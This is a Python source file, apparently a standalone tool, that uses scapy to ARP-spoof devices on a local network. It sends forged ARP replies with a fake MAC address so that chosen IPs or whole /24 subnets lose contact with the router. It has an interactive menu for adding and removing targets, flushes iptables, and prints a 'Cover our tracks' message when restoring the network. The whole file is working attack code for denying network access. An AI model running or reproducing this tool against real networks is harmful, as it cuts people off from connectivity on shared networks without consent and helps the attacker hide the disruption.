import scapy.all as scapy
from logging import getLogger, ERROR
from colorama import Fore
from modules.net_scan import arp_scan
from time import sleep
from subprocess import call 
from modules.interface_settings import check_default_ip_route
from modules.net_scan import scan, ip_check

getLogger("scapy.runtime").setLevel(ERROR)


def ip_mac_table(ip_dict):
    call('clear')
    print(Fore.LIGHTCYAN_EX + ' ' + '-' * 39 + Fore.RESET)                              
    print(Fore.LIGHTCYAN_EX + ' | {:^15} | {:^17} |'.format('IP', 'MAC') + Fore.RESET)  
    print(Fore.LIGHTCYAN_EX + ' ' + '-' * 39 + Fore.RESET)                              
    for ip_mac in ip_dict:
        print(Fore.LIGHTCYAN_EX + ' | {:^15} | {:^17} |'.format(ip_mac['ip'],ip_mac['mac']) + Fore.RESET)
        print(Fore.LIGHTCYAN_EX + ' ' + '-' * 39 + Fore.RESET)



def restored_network(ip_dict, spoof_ip=check_default_ip_route()):
    if not ip_dict:
        return
    ip_list = [entry['ip'] for entry in ip_dict]
    if check_default_ip_route() in ip_list: ip_list.remove(check_default_ip_route())
    print('\r',' '*90,end='')
    print(Fore.LIGHTYELLOW_EX + '\r[INFO] Cover our tracks\r' + Fore.RESET, end='')
    sleep(1)
    print(Fore.GREEN + f'\r[INFO] Network restored: ' + Fore.RESET, end='')
    for target_ip in ip_list:
        attempts = 10
        while attempts:
            sleep(0.2)
            spoof_mac = arp_scan(spoof_ip)
            target_mac = arp_scan(target_ip)
            if target_mac and spoof_mac:
                packet_S = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac['mac'], psrc=spoof_ip, hwsrc=spoof_mac['mac'])
                packet_R = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac['mac'], psrc=target_ip, hwsrc=target_mac['mac'])
                    
                scapy.send(packet_S, verbose=False)
                scapy.send(packet_R, verbose=False)
                sleep(0.1)
                print(Fore.GREEN +f'{target_ip} ' + Fore.RESET, end='')
                break
            else:
                attempts -= 1
                if attempts <=  0:
                    sleep(0.1)
                    print(Fore.LIGHTYELLOW_EX + f'{target_ip} ' + Fore.RESET, end='')
                    break


def pause(ip_dict):
    try:
        _ = input(Fore.LIGHTCYAN_EX + '\nAdd_IP(1) Delete_IP(2) Continue_blocking(3) Restored_Network(4).\n Enter process number: ' + Fore.RESET).lower()
        while _ not in '1234' and _ not in ['add','delete','continue','restored']:
            _ = input(Fore.LIGHTCYAN_EX + 'Enter correct process number: '+ Fore.RESET)
        ip_list = list(entry['ip'] for entry in ip_dict)
        if _ == '1' or _ == 'add':
            new_ip = input(Fore.LIGHTCYAN_EX + 'Enter IP address to add: '+ Fore.RESET)
            if new_ip not in ip_list:
                if new_ip.endswith('/24') and ip_check(new_ip):
                    return net_block(new_ip) 
                else:
                    if ip_check(new_ip):
                        if new_ip != check_default_ip_route():
                            new_ip = arp_scan(new_ip,retry=100)
                            if new_ip:
                                ip_dict.append(new_ip)
                                ip_dict = sorted(ip_dict, key=lambda key: key['ip'])
                                ip_mac_table(ip_dict)
                            else: print(Fore.LIGHTCYAN_EX + 'Unknown IP address'+ Fore.RESET)
                        else: print(Fore.LIGHTYELLOW_EX + 'Cannot add router IP address')
            else: print(Fore.LIGHTCYAN_EX + 'IP address already in list' + Fore.RESET)
    
            return pause(ip_dict)
        if _ =='2' or _ == 'delete':
            
            del_ip = input(Fore.LIGHTCYAN_EX + 'Enter IP adress to delete: '+ Fore.RESET)
            if del_ip in ip_list:
                restored_network([next((ip for ip in ip_dict if ip['ip'] == del_ip),None)])
                ip_dict = list(filter(lambda ip: ip['ip'] != del_ip, ip_dict))
                print(Fore.LIGHTCYAN_EX + 'IP adress deleted'+ Fore.RESET)
                sleep(0.5)
                ip_mac_table(ip_dict)
            else:
                print(Fore.LIGHTCYAN_EX + 'Invalid or missing IP address'+ Fore.RESET)
    
            return pause(ip_dict)
        if _ =='3' or _ == 'continue':
            return spoof(ip_dict)
        if _ =='4' or _ == 'restored':
            return restored_network(ip_dict)
    except KeyboardInterrupt:
        restored_network(ip_dict)





def spoof(ip_dict, spoof_ip=check_default_ip_route(), fake_mac=True):
    try:
        if not spoof_ip:    
            spoof_ip = input(Fore.LIGHTYELLOW_EX + '\n[INFO] Failed to detect router`s IP. Enter manually: ' + Fore.RESET)
            if not ip_check(spoof_ip): 
                print(Fore.LIGHTYELLOW_EX + '[INFO] Incorrect interface' + Fore.RESET)
                return
        ip_list = [entry['ip'] for entry in ip_dict]
        if check_default_ip_route() in ip_list: ip_list.remove(check_default_ip_route())

        try:
            if not ip_dict:
                print(Fore.LIGHTYELLOW_EX + '\n[INFO] No IP addresses found to blocking' + Fore.RESET)
                return pause(ip_dict)
            print(Fore.LIGHTYELLOW_EX + '\n[INFO] Packet transmission is starting\r' + Fore.RESET, end='')
            sleep(1)
            print('\r',' '*50,end='')

            while True:
                print(Fore.GREEN + f'\r[INFO] Blocked`s: ' + Fore.RESET, end='')
                for target_ip in ip_list:
                    spoof_mac = arp_scan(spoof_ip)
                    target_mac = arp_scan(target_ip)
                    if target_mac and spoof_mac:
                        if fake_mac:
                            packet_S = scapy.ARP(op=2, pdst=target_ip, hwsrc='11:11:11:11:11:11', hwdst=target_mac['mac'], psrc=spoof_ip)
                            packet_R = scapy.ARP(op=2, pdst=spoof_ip, hwsrc='11:11:11:11:11:11', hwdst=spoof_mac['mac'], psrc=target_ip)
                        else:
                            packet_S = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac['mac'], psrc=spoof_ip)
                            packet_R = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac['mac'], psrc=target_ip)
                        sleep(0.1)
                        print(Fore.GREEN +f'{target_ip} ' + Fore.RESET, end='')

                        scapy.send(packet_S, verbose=False)
                        scapy.send(packet_R, verbose=False)
                    else:
                        sleep(0.1)
                        print(Fore.LIGHTYELLOW_EX + f'{target_ip} ' + Fore.RESET, end='')
                
        except KeyboardInterrupt:
                return pause(ip_dict)
                
   
        except AttributeError:
            print(Fore.LIGHTYELLOW_EX + '\r[INFO] ' + Fore.RESET)
   
    except:
        pass
def net_block(ip):
    try:
        if ip_check(ip):
            call(['iptables','--flush'])
            call('clear')
            if ip.endswith('/24'):
                ip = scan(ip)
            else: ip = scan(ip,retry=100)
    
            return spoof(ip)
    except: pass




        
if __name__ == '__main__':
    net_block(input(':'))
